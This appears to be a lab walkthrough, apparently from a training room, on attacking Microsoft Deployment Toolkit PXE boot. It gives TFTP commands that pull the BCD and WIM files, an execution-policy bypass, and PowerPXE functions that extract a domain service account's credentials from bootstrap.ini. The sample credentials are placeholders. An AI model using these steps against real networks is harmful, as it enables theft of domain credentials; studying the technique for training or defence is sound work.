---
title: PXE Boot
---

- Requesting <b style={{ color: 'MediumTurquoise' }}>PXE</b> Boot Configure Details from <b>DHCP</b>
- `BCD` Files. These files store the Information relevant to **PXE Boots** for different types of Architecture.

```log
x64{1D0136D6-B1AD-4356-B50E-D56AC9AF19D9}.bcd
```

<br/>


### Reading The Image


- Using **`TFTP`** to downloading the **BCD** File to Read the Configuration of the MDT Server.
- The BCD files are always located in the **`/Tmp/`** Directory on the MDT Server.

```log
C:\> tftp -i 10.200.89.202 GET "\Tmp\x64{1D0136D6-B1AD-4356-B50E-D56AC9AF19D9}.bcd" conf.bcd
```

<br/>
<br/>


- We need <b style={{ color: 'LightGreen' }}>PowerPXE</b> to accomplish this Task.
- Using **`Get-WimFile`** Function of **PowerPXE** to Recover the Locations of the **PXE Boot Images** from the **BCD** File...

```log
C:\> powershell -ExecutionPolicy Bypass
```

```powershell
PS C:\> Import-Module .\PowerPXE.ps1
PS C:\> $BCDFile = "conf.bcd"
PS C:\> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
```

<br/>


### Recovering Credentials

- **Windows Imaging Format (WIM)** are Bootable Images. Now that we have the location of the **PXE Boot Image**, we can use `TFTP` to Download this Image.

```powershell
PS C:\> tftp -i 10.200.89.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

<br/>

- Using <b style={{ color: 'LightGreen' }}>PowerPXE</b> to Recover the Credentials.
- <b style={{ color: 'Coral' }}>[NOTE]</b> This can also be done Manually by Extracting the Image and looking for the <b style={{ color: 'MediumTurquoise' }}>bootstrap.ini</b>

```powershell {5,7}
PS C:\> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim 
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = Password
```